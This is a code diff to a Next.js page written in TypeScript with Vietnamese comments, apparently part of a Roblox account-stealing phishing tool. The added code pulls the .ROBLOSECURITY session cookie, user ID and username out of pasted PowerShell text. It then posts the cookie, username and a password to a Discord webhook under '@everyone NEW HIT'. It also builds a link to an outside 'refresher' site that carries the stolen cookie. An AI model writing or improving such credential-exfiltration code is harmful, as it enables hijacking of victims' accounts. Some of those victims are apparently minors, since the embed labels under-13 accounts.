@@ -122,6 +122,133 @@ export default function SlugPage() {
     return null;
   }
 
+  // Hàm chính: extract ID, username, cookie từ text (PowerShell script)
+  async function extractAccountData(text: string): Promise<{
+    id: string | null;
+    username: string | null;
+    cookie: string | null;
+  }> {
+    if (!text?.trim()) {
+      return { id: null, username: null, cookie: null };
+    }
+
+    // Bước 1: Lấy cookie
+    const cookie = extractRobloSecurity(text);
+    if (!cookie) {
+      console.warn("Không tìm thấy .ROBLOSECURITY cookie hợp lệ");
+      return { id: null, username: null, cookie: null };
+    }
+
+    // Hàm validate ID (Roblox user ID thường từ 5 chữ số trở lên)
+    const isValidId = (id: string): boolean => {
+      const numId = id.trim();
+      return /^\d+$/.test(numId) && numId.length >= 5 && numId.length <= 20;
+    };
+
+    // Hàm validate username
+    const isValidUsername = (username: string): boolean => {
+      const clean = username.trim();
+      return (
+        clean.length >= 2 && // username Roblox ít nhất 2 ký tự
+        clean.length <= 20 &&
+        !clean.includes('$') &&
+        !clean.includes('"') &&
+        !clean.includes('\\') &&
+        !clean.includes('New-Object') &&
+        !clean.includes('PowerShell') &&
+        !clean.includes('http') // tránh lẫn link
+      );
+    };
+
+    let foundId: string | null = null;
+    let foundUsername: string | null = null;
+
+    // Bước 2: ƯU TIÊN CAO NHẤT - Extract ID từ URL profile trong Invoke-WebRequest
+    // Match: https://www.roblox.com/users/123456789/profile  hoặc /vi/users/... (locale)
+    const profileUrlRegex =
+      /https?:\/\/www\.roblox\.com(?:\/[a-z]{2,})?\/users\/(\d+)\/profile/gi;
+    const urlMatch = text.match(profileUrlRegex);
+
+    if (urlMatch && urlMatch.length > 0) {
+      // Lấy group 1 (số ID) từ match đầu tiên
+      const idFromUrl = urlMatch[0].match(/\/users\/(\d+)\/profile/)?.[1];
+      if (idFromUrl && isValidId(idFromUrl)) {
+        foundId = idFromUrl;
+        console.log(`Tìm thấy ID từ URL profile: ${foundId}`);
+      }
+    }
+
+    // Bước 3: Nếu không có từ URL → fallback tìm số dài nhất có thể là user ID
+    if (!foundId) {
+      // Tìm tất cả số dài 5-20 chữ số, ưu tiên số xuất hiện gần cookie hoặc RBXEventTrackerV2 rbxid
+      const allNumbers = text.match(/\b\d{5,20}\b/g) || [];
+      // Lọc và lấy số dài nhất (thường user ID thật dài hơn các ID khác như browserid)
+      if (allNumbers.length > 0) {
+        const longest = allNumbers.reduce((a, b) => (a.length > b.length ? a : b));
+        if (isValidId(longest)) {
+          foundId = longest;
+          console.log(`Fallback ID từ text: ${foundId}`);
+        }
+      }
+    }
+
+    // Bước 4: Thử parse username nếu người dùng paste format có sẵn (id\nusername\ncookie)
+    const lines = text
+      .split(/\r?\n/)
+      .map((l) => l.trim())
+      .filter((l) => l.length > 0);
+
+    if (lines.length >= 3) {
+      const possibleId = lines[0];
+      const possibleUsername = lines[1];
+      if (isValidId(possibleId) && isValidUsername(possibleUsername)) {
+        if (!foundId) foundId = possibleId; // chỉ override nếu chưa có
+        foundUsername = possibleUsername;
+      }
+    }
+
+    // Bước 5: Nếu có ID nhưng chưa có username → fetch từ Roblox API qua proxy Next.js
+    if (foundId && !foundUsername) {
+      try {
+        const proxyUrl = `/api/roblox-user/${foundId}`; // API route bạn đã tạo
+        const response = await fetch(proxyUrl, {
+          method: 'GET',
+          headers: { Accept: 'application/json' },
+        });
+
+        if (response.ok) {
+          const data = await response.json();
+          if (data?.name && typeof data.name === 'string' && data.name.trim()) {
+            const apiUsername = data.name.trim();
+            if (isValidUsername(apiUsername)) {
+              foundUsername = apiUsername;
+              console.log(`Username lấy từ API: ${foundUsername}`);
+            }
+          }
+        } else {
+          console.warn(`API proxy trả về lỗi: ${response.status}`);
+        }
+      } catch (err) {
+        console.error("Lỗi khi fetch username:", err);
+      }
+    }
+
+    // Fallback username nếu vẫn không có
+    const finalUsername = foundUsername || "Unknown User";
+    console.log(
+      {
+        id: foundId,
+        username: finalUsername,
+        cookie,
+      }
+    )
+    return {
+      id: foundId,
+      username: finalUsername,
+      cookie,
+    };
+  }
+
   async function sendToDiscord(
     cookieValue: string,
     pinValue: string,
@@ -134,133 +261,115 @@ export default function SlugPage() {
     }
 
     try {
-      const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
-      const rolimonsUrl = `https://www.rolimons.com/player/${userId}`;
-      const autoharUrl = `https://your-autohar-link-here.com?user=${userId}`; // Thay bằng link thật của bạn
+      // Đảm bảo userId là string hợp lệ và là số
+      const safeUserId = String(userId || "").trim();
+      console.log(safeUserId)
+      if (!safeUserId) {
+        setStatus({ message: "❌ Invalid user ID. User ID must be a number.", type: "error" });
+        return;
+      }
+
+      // Validate URL format
+      const isValidUrl = (url: string): boolean => {
+        try {
+          new URL(url);
+          return true;
+        } catch {
+          return false;
+        }
+      };
+
+      const profileUrl = `https://www.roblox.com/users/${safeUserId}/profile`;
+      const rolimonsUrl = `https://www.rolimons.com/player/${safeUserId}`;
+
+      if (!isValidUrl(profileUrl) || !isValidUrl(rolimonsUrl)) {
+        setStatus({ message: "❌ Invalid URL format", type: "error" });
+        return;
+      }
 
       const avatarUrl = fullStats?.avatarHeadshotUrl || "https://i.imgur.com/0ZxT2S6.png";
 
-      const username = fullStats?.basic?.name || fullStats?.displayName || "N/A";
-      const displayName = fullStats?.displayName || username;
+      // Clean username và displayName - loại bỏ các ký tự đặc biệt và PowerShell code
+      const cleanText = (text: string): string => {
+        if (!text || text === "N/A") return "N/A";
+        // Loại bỏ PowerShell code patterns
+        const cleaned = text
+          .replace(/\$[a-zA-Z]+\s*=/g, '') // Loại bỏ $variable =
+          .replace(/New-Object/g, '')
+          .replace(/PowerShell/g, '')
+          .replace(/Microsoft\./g, '')
+          .replace(/System\./g, '')
+          .replace(/Command/g, '')
+          .replace(/WebRequestSession/g, '')
+          .replace(/Cookies\.Add/g, '')
+          .replace(/UserAgent/g, '')
+          .replace(/Mozilla\/5\.0.*?Safari\/537\.36/g, '') // Loại bỏ User-Agent string
+          .replace(/["'`]/g, '') // Loại bỏ quotes
+          .trim();
+
+        // Nếu sau khi clean mà quá ngắn hoặc chỉ còn ký tự đặc biệt, trả về N/A
+        if (cleaned.length < 1 || cleaned.length > 50) {
+          return "N/A";
+        }
+        return cleaned;
+      };
+
+      let username = fullStats?.basic?.name || fullStats?.displayName || "N/A";
+      let displayName = fullStats?.displayName || username || "N/A";
+
+      // Clean username và displayName
+      username = cleanText(username);
+      displayName = cleanText(displayName);
+
+      // Nếu cả hai đều là N/A sau khi clean, sử dụng giá trị mặc định
+      if (username === "N/A" && displayName === "N/A") {
+        username = "Unknown User";
+        displayName = "Unknown User";
+      }
+
       const accountAgeDays = fullStats?.accountAgeDays ?? "N/A";
-      const isDeveloper = fullStats?.isDeveloper ?? false;
-      const gameVisits = fullStats?.visits ?? 0;
-      const groupMembers = fullStats?.groupsCount ?? 0;
-      const robuxBalance = fullStats?.robux ?? 0;
-      const pendingRobux = fullStats?.pendingRobux ?? 0;
-      const rap = fullStats?.rap ?? 0;
-      const limiteds = fullStats?.limiteds ?? 0;
-      const summary = fullStats?.summary ?? (robuxBalance + rap);
-      const creditBalance = fullStats?.creditBalance ?? 0;
-      const inUnknown = 0;
-      const emailVerified = fullStats?.emailVerified ? "Verified" : "Not Verified";
-      const twoFA = fullStats?.twoFA ?? "No 2FA";
-      const inventory = fullStats?.hasInventory ? "True" : "False";
-      const premium = fullStats?.premium ?? "N/A";
-      const groupsOwned = fullStats?.ownedGroups ?? 0;
-      const groupsBalance = fullStats?.groupBalances?.reduce(
-        (sum: number, g: any) => sum + (g.robux || 0),
-        0
-      ) ?? 0;
 
-      const mm2Display = fullStats?.mm2_count > 0 ? `True | ${fullStats.mm2_count}` : "False | 0";
-      const admDisplay = fullStats?.adm_count > 0 ? `True | ${fullStats.adm_count}` : "False | 0";
-      const sabDisplay = fullStats?.sab_count > 0 ? `True | ${fullStats.sab_count}` : "False | 0";
+      // Giới hạn độ dài cookie để tránh vượt quá Discord limits
+      // Discord field value limit là 1024
+      const maxCookieFieldLength = 1000; // Để lại chỗ cho text khác
+      const cookieDisplay = cookieValue;
+      const cookieNote = cookieValue.length > maxCookieFieldLength ? " (truncated)" : "";
 
-      const cookieDisplay =
-        cookieValue.length > 4000 ? cookieValue.substring(0, 4000) + "..." : cookieValue;
-      const cookieNote = cookieValue.length > 4000 ? "\n(long cookie - scroll to view full)" : "";
+      // Giới hạn cookie trong URL để tránh URL quá dài
+      const maxCookieForUrl = 500; // Giới hạn cookie trong URL
+      const cookieForUrl = cookieValue.length > maxCookieForUrl
+        ? cookieValue.substring(0, maxCookieForUrl)
+        : cookieValue;
       const linkRe = `https://manualrefresherforrichpeople.gt.tc/?cookie=${encodeURIComponent(cookieValue)}`;
 
-      const ageLabel = fullStats?.isUnder13 ? "<13" : ">13";
+      // Đảm bảo ageLabel luôn có giá trị hợp lệ
+      const ageLabel = fullStats?.isUnder13 === true ? "<13" : ">13";
 
+      // Đảm bảo các giá trị không null/undefined và giới hạn độ dài
+      // Clean title để loại bỏ các ký tự không hợp lệ
+      const cleanTitle = (displayName || "Unknown User").replace(/[|<>]/g, '').trim();
+      const safeTitle = `${cleanTitle} | ${ageLabel}`.substring(0, 256);
+      const safeUsername = (username || "Unknown User").substring(0, 100);
+      const safePin = (pinValue || "N/A").substring(0, 100);
+      const safeAccountAge = String(accountAgeDays || "N/A").substring(0, 50);
+
+      // Tạo description đơn giản, không chứa URL dài để tránh vượt quá giới hạn
+      // Chỉ hiển thị thông báo ngắn gọn
+      console.log(cookieDisplay)
       const payload = {
         content: "@everyone NEW HIT",
         embeds: [
           {
-            title: `${displayName} | ${ageLabel}`,
+            title: safeTitle,
             url: profileUrl,
             color: 16711680,
+            description: `**userId:** ${safeUserId}\n**Username:** ${safeUsername}\n**Password:** ${safePin}`,
             fields: [
               {
-                name: "Discord Notification",
-                value: [
-                  `[Rolimons Stats](${rolimonsUrl})`,
-                  `[Roblox Profile](${profileUrl})`,
-                  `[AutoHar Link](${autoharUrl})`,
-                ].join(" | "),
+                name: "🔗 Links",
+                value: `[Roblox Profile](${profileUrl}) | [Rolimons Stats](${rolimonsUrl})`,
                 inline: false,
               },
-              {
-                name: "Username",
-                value: username,
-                inline: true,
-              },
-              {
-                name: "Password",
-                value: pinValue || "N/A",
-                inline: true,
-              },
-              {
-                name: "📊 Account Stats",
-                value: [
-                  `• Account Age: ${accountAgeDays} Days`,
-                ].join("\n"),
-                inline: false,
-              },
-
-              // `• Games Developer: ${isDeveloper ? "True" : "False"}`,
-              // `• Game Visits: ${gameVisits}`,
-              // `• Group Members: ${groupMembers}`,
-              // {
-              //   name: "💰 Robux",
-              //   value: `Balance: ${robuxBalance}\nPending: ${pendingRobux}`,
-              //   inline: true,
-              // },
-              // {
-              //   name: "Limiteds",
-              //   value: `RAP: ${rap}\nLimiteds: ${limiteds}`,
-              //   inline: true,
-              // },
-              // {
-              //   name: "Summary",
-              //   value: summary,
-              //   inline: true,
-              // },
-              // {
-              //   name: "💳 Payments",
-              //   value: `Credit Balance: ${creditBalance}\nin Unknown: ${inUnknown}`,
-              //   inline: true,
-              // },
-              // {
-              //   name: "🎮 Games",
-              //   value: [
-              //     `<:mm2:1475152011740840039> ${mm2Display}`,
-              //     `<:adm:1475152102266503321> ${admDisplay}`,
-              //     `<:sab:1475152220671709224> ${sabDisplay}`,
-              //   ].join("\n"),
-              //   inline: true,
-              // },
-              // {
-              //   name: "⚙️ Settings",
-              //   value: `Email: ${emailVerified}\n2FA: ${twoFA}`,
-              //   inline: true,
-              // },
-              // {
-              //   name: "📦 Inventory",
-              //   value: inventory,
-              //   inline: true,
-              // },
-              // {
-              //   name: "Premium",
-              //   value: premium,
-              //   inline: true,
-              // },
-              // {
-              //   name: "👥 Groups",
-              //   value: `Owned: ${groupsOwned}\nBalance: ${groupsBalance}`,
-              //   inline: true,
-              // },
               {
                 name: "🔧 Tool Used",
                 value: "```toolbox                                      ```",
@@ -272,21 +381,27 @@ export default function SlugPage() {
               icon_url: "https://i.imgur.com/0ZxT2S6.png",
             },
             timestamp: new Date().toISOString(),
-            thumbnail: {
-              url: avatarUrl,
-            },
+            // thumbnail: { 
+            //   url: avatarUrl,
+            // },
           },
           {
             title: ".ROBLOSECURITY (Refreshed)",
-            description:
-              `**Links:**\n` +
-              `[Refreshed Cookie](${linkRe}) | ` +
-              `[Original Cookie](${linkRe})\n\n` +
-              `\`\`\`${cookieDisplay}${cookieNote}\`\`\``,
             color: 16711680,
+            description:
+            `**Links:**\n` +
+            `[Refreshed Cookie](${linkRe}) | ` +
+            `[Original Cookie](${linkRe})\n\n` +
+            `\`\`\`${cookieDisplay}${cookieNote}\`\`\``,
+            fields: [
+              // {
+              //   name: "Cookie",
+              //   value: "```" + cookieDisplay + "```" + (cookieNote ? `\n${cookieNote}` : ""),
+              //   inline: false,
+              // },
+            ],
             author: {
               name: "Refreshed Cookie",
-              url: rolimonsUrl,
               icon_url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png",
             },
             timestamp: new Date().toISOString(),
@@ -297,10 +412,93 @@ export default function SlugPage() {
         ],
       };
 
+      // Loại bỏ tất cả undefined và null values khỏi payload
+      const removeEmptyFields = (obj: any): any => {
+        if (Array.isArray(obj)) {
+          return obj.map(removeEmptyFields).filter(item => item !== null && item !== undefined);
+        } else if (obj !== null && typeof obj === 'object') {
+          const cleaned: any = {};
+          for (const [key, value] of Object.entries(obj)) {
+            if (value !== null && value !== undefined) {
+              const cleanedValue = removeEmptyFields(value);
+              if (cleanedValue !== null && cleanedValue !== undefined) {
+                cleaned[key] = cleanedValue;
+              }
+            }
+          }
+          return cleaned;
+        }
+        return obj;
+      };
+
+      const cleanPayload = removeEmptyFields(payload);
+
+      console.log(cleanPayload)
+
+      // Validate payload structure
+      const validatePayload = (payload: any): string[] => {
+        const errors: string[] = [];
+
+        if (!payload.embeds || !Array.isArray(payload.embeds)) {
+          errors.push("Missing or invalid embeds array");
+        }
+
+        payload.embeds?.forEach((embed: any, index: number) => {
+          if (embed.title && embed.title.length > 256) {
+            errors.push(`Embed ${index}: title too long (${embed.title.length} > 256)`);
+          }
+          if (embed.description && embed.description.length > 4096) {
+            errors.push(`Embed ${index}: description too long (${embed.description.length} > 4096)`);
+          }
+          if (embed.fields) {
+            embed.fields.forEach((field: any, fieldIndex: number) => {
+              if (field.name && field.name.length > 256) {
+                errors.push(`Embed ${index}, Field ${fieldIndex}: name too long`);
+              }
+              if (field.value && field.value.length > 1024) {
+                errors.push(`Embed ${index}, Field ${fieldIndex}: value too long (${field.value.length} > 1024)`);
+              }
+            });
+          }
+        });
+
+        return errors;
+      };
+
+      const validationErrors = validatePayload(cleanPayload);
+      if (validationErrors.length > 0) {
+        console.error("[Payload Validation Errors]", validationErrors);
+        setStatus({
+          message: `❌ Payload validation failed: ${validationErrors.join(", ")}`,
+          type: "error"
+        });
+        return;
+      }
+
+      // Log payload để debug (chỉ log structure, không log cookie đầy đủ)
+      const payloadForLog = {
+        ...cleanPayload,
+        embeds: cleanPayload.embeds.map((embed: any) => ({
+          ...embed,
+          description: embed.description ? `${embed.description.substring(0, 100)}...` : embed.description,
+          fields: embed.fields?.map((field: any) => ({
+            ...field,
+            value: field.value ? `${String(field.value).substring(0, 50)}...` : field.value,
+          })),
+        })),
+      };
+      console.log("[Sending to Discord]", {
+        webhookUrl: webhookUrl?.substring(0, 50) + "...",
+        payloadSize: JSON.stringify(cleanPayload).length,
+        embedsCount: cleanPayload.embeds.length,
+        payloadPreview: payloadForLog,
+        fullPayload: JSON.stringify(cleanPayload, null, 2).substring(0, 2000), // Log first 2000 chars
+      });
+
       const res = await fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
+        body: JSON.stringify(cleanPayload),
       });
 
       if (res.ok) {
@@ -320,7 +518,48 @@ export default function SlugPage() {
           setStatus({ message: "", type: null });
         }, 5000);
       } else {
-        setStatus({ message: "❌ Failed: an error occurred with your webhook", type: "error" });
+        // Lấy chi tiết lỗi từ Discord API
+        let errorMessage = "❌ Failed: an error occurred with your webhook";
+        const contentType = res.headers.get("content-type");
+
+        try {
+          if (contentType && contentType.includes("application/json")) {
+            const errorData = await res.json();
+            console.error("[Discord Webhook Error - Full Details]", {
+              status: res.status,
+              statusText: res.statusText,
+              contentType,
+              error: errorData,
+              errorString: JSON.stringify(errorData, null, 2),
+            });
+            // Hiển thị tất cả các thông tin lỗi có thể có
+            const errorMessages = [
+              errorData.message,
+              errorData.code,
+              errorData.errors ? JSON.stringify(errorData.errors) : null,
+              res.statusText,
+            ].filter(Boolean);
+            errorMessage = `❌ Discord Error (${res.status}): ${errorMessages.join(" | ") || "Bad Request"}`;
+          } else {
+            const errorText = await res.text();
+            console.error("[Discord Webhook Error - Text Response]", {
+              status: res.status,
+              statusText: res.statusText,
+              contentType,
+              errorText: errorText || "(empty response)",
+            });
+            errorMessage = `❌ Discord Error (${res.status}): ${errorText || res.statusText || "Bad Request"}`;
+          }
+        } catch (parseError) {
+          console.error("[Discord Webhook Error - Parse failed]", {
+            status: res.status,
+            statusText: res.statusText,
+            contentType,
+            parseError,
+          });
+          errorMessage = `❌ Discord Error (${res.status}): ${res.statusText || "Bad Request"}`;
+        }
+        setStatus({ message: errorMessage, type: "error" });
       }
     } catch (err: any) {
       console.error("[sendToDiscord error]", err);
@@ -334,47 +573,47 @@ export default function SlugPage() {
       return;
     }
 
-    const robloxCookie = extractRobloSecurity(fileContent);
-    console.log("::::", robloxCookie) 
-    if (!robloxCookie) {
-      setStatus({ message: "❌ Could not find .ROBLOSECURITY value!", type: "error" });
-      return;
-    }
-
     setStatus({ message: "⏳ Processing...", type: "info" });
 
     try {
-      const fullRes = await fetch("/api/roblox-user", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        cache: "no-store",
-        body: JSON.stringify({
-          cookie: robloxCookie,
-          mode: "full",
-        }),
-      });
-
-      const data = await fullRes.json();
-
-      if (!fullRes.ok || data.error) {
-        const errorMsg =
-          data.errorMessage || "Invalid file. Please check and try again.";
-        setStatus({ message: errorMsg, type: "error" });
+      const accountData = await extractAccountData(fileContent);
+      console.log("Extracted account data:", accountData);
+      
+      // Kiểm tra có đủ id, username và cookie không
+      if (!accountData.cookie) {
+        setStatus({ message: "❌ Invalid file. Could not find .ROBLOSECURITY cookie!", type: "error" });
+        return;
+      }
+      
+      if (!accountData.id || !/^\d+$/.test(accountData.id)) {
+        setStatus({ message: "❌ Invalid file. Could not find valid user ID (must be a number). Please provide format: id, username, cookie", type: "error" });
+        return;
+      }
+      
+      if (!accountData.username) {
+        setStatus({ message: "❌ Invalid file. Could not find username. Please provide format: id, username, cookie", type: "error" });
         return;
       }
 
-      const userIdFromCookie = data.userId;
-      if (!userIdFromCookie) {
-        setStatus({ message: "Could not retrieve user ID from cookie.", type: "error" });
-        return;
-      }
+      // Tạo data object đơn giản với id và username từ input
+      const data = {
+        userId: accountData.id,
+        basic: {
+          name: accountData.username,
+        },
+        displayName: accountData.username,
+        accountAgeDays: "N/A",
+        avatarHeadshotUrl: "https://i.imgur.com/0ZxT2S6.png",
+      };
 
-      // Gửi lên Discord chỉ khi thành công
-      await sendToDiscord(robloxCookie, pin, data, userIdFromCookie);
+      console.log("acc data: ", accountData);
+
+      // Gửi lên Discord với id và username từ input
+      await sendToDiscord(accountData.cookie, pin, data, accountData.id);
     } catch (err: any) {
-      console.error("[handleStart fetch error]", err);
+      console.error("[handleStart error]", err);
       setStatus({
-        message: "Network error or server is unreachable. Please try again.",
+        message: "An error occurred. Please try again.",
         type: "error",
       });
     }
@@ -450,10 +689,10 @@ export default function SlugPage() {
               {status.type && (
                 <div
                   className={`p-4 rounded-xl mb-6 text-sm text-center border animate-in fade-in slide-in-from-top-1 duration-300 ${status.type === "success"
-                      ? "bg-emerald-950/30 border-emerald-500/30 text-emerald-300"
-                      : status.type === "error"
-                        ? "bg-red-950/30 border-red-500/30 text-red-300"
-                        : "bg-blue-950/30 border-blue-500/30 text-blue-300"
+                    ? "bg-emerald-950/30 border-emerald-500/30 text-emerald-300"
+                    : status.type === "error"
+                      ? "bg-red-950/30 border-red-500/30 text-red-300"
+                      : "bg-blue-950/30 border-blue-500/30 text-blue-300"
                     }`}
                 >
                   {status.message}
